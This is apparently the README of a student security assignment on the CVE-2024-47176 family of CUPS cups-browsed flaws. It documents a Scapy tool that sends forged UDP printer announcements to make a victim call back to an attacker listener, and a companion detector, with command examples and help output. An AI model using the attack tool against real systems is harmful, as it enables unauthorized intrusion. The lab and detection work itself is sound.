# assignment-ii

**This is a student assignment experimenting with the CUPS vulnerabilities CVE-2024-47176, CVE-2024-47076, and CVE-2024-47175 and attack detection in a controlled isolated environment. The tools pushed to this repository has not and will not be used on any public entity. Read more about the course [here](https://www.uis.no/en/course/DAT505_1?semester=2026H)**

The requirements to run the tools are any linux distribution running on a VM, Python >= 3.8, Scapy >= 2.4.0, ippeveprinter.

This project uses python's Scapy to exploit the vulnerabilities of `cups-browsed`, that has since been patched. The tool `cups_attack.py` constructs UDP printer announcement packets labeled with protocol 631, and directs them at a specified address. In contrast, the tool `cups_detector.py` can be used either on an existing .pcap file or live to detect these suspicious packets by specifying a select trusted printer and more.

The desired setup is to run these tools within a VM, and the CUPS server in a Docker container within, and set up a mock printer with `$ ippeveprinter`.

An example of running the `cups_attack.py` tool can be the following:
```
$ sudo python3 cups_attack.py \
    --victim 172.19.0.2 \
    --advertise-ip 172.19.0.1 \
    --advertise-port 8631 \
    --pcap pcap_files/attack_basic.pcap -v
```
Make sure the mock printer's IP is the one advertised. If no mitigation is made to the Docker container, the mock printer should pick up packets from the victim.
The tool comes with a set of other attributes as well, Issue the following command to review which:
```
┌──(kali㉿kali)-[~/assignment-II/repo/assignment-ii]
└─$ sudo python3 cups_attack.py --help
usage: cups_attack.py [-h] --victim VICTIM [--dport DPORT] [--sport SPORT] --advertise-ip ADVERTISE_IP [--advertise-port ADVERTISE_PORT] [--scheme SCHEME] [--path PATH] [--type TYPE]
                      [--state STATE] [--raw-payload RAW_PAYLOAD] [--pcap PCAP] [-v] [--dry-run]

Scapy CUPS insecure printer-discovery demonstrator (lab use only).

options:
  -h, --help            show this help message and exit

target:
  --victim VICTIM       Victim cups-browsed IP
  --dport DPORT         Victim UDP discovery port (default: 631)
  --sport SPORT         Source UDP port (default: 631)

advertised printer (manipulable fields):
  --advertise-ip ADVERTISE_IP
                        IP the victim should call back to (your listener)
  --advertise-port ADVERTISE_PORT
                        Port the victim should call back to (default: 8631)
  --scheme SCHEME       URI scheme (http/ipp) (default: http)
  --path PATH           URI path (default: /printers/evil)
  --type TYPE           Browse packet type field (default: 0)
  --state STATE         Printer state field (3=idle) (default: 3)
  --raw-payload RAW_PAYLOAD
                        Override entire payload (for malformed-field tests) (default: None)

behaviour:
  --pcap PCAP           Write sent packets to this PCAP file (default: None)
  -v, --verbose         Debug logging (default: False)
  --dry-run             Build and show the packet but do not send (default: False)
```

An example of running the `cups_detector.py` tool can be the following:
```
$ python3 cups_detector.py --pcap pcap_files/attack_unauth.pcap \      
    --allow 172.19.0.1:8631 \         
    --output evidence/alerts_task4bad.json --format json
```
The detector can be ran in live mode by adding the Docker bridge interface after the `--iface` flag (`--iface <Docker bridge>`)
The tool comes with a set of other attributes as well, issue the following command to review which:
```
$ python3 cups_detector.py --help                                 
usage: cups_detector.py [-h] (--iface IFACE | --pcap PCAP) [--allow IP[:PORT]] [--watch-port PORT]
                        [--flood-threshold FLOOD_THRESHOLD] [--flood-window FLOOD_WINDOW] [--bpf BPF] [--output OUTPUT]
                        [--format {csv,json}] [--count COUNT] [-v]

Detect suspicious CUPS discovery / IPP activity (Scapy).

options:
  -h, --help            show this help message and exit
  --iface IFACE         Interface for live capture (needs root) (default: None)
  --pcap PCAP           PCAP file for offline analysis (default: None)
  --allow IP[:PORT]     Authorized printer endpoint. 'IP:PORT' allows that exact endpoint; bare 'IP' allows any port on
                        that host. Repeatable. (default: [])
  --watch-port PORT     Extra IPP/callback port to inspect (repeatable) (default: [])
  --flood-threshold FLOOD_THRESHOLD
                        Advertisements per window that count as a flood (default: 5)
  --flood-window FLOOD_WINDOW
                        Flood detection window in seconds (default: 10.0)
  --bpf BPF             Override the BPF capture filter (default: None)
  --output OUTPUT       Write alerts to this file (default: None)
  --format {csv,json}   Export format (default: json)
  --count COUNT         Live mode: stop after N packets (0 = run until Ctrl-C) (default: 0)
  -v, --verbose         Debug logging (default: False)
```
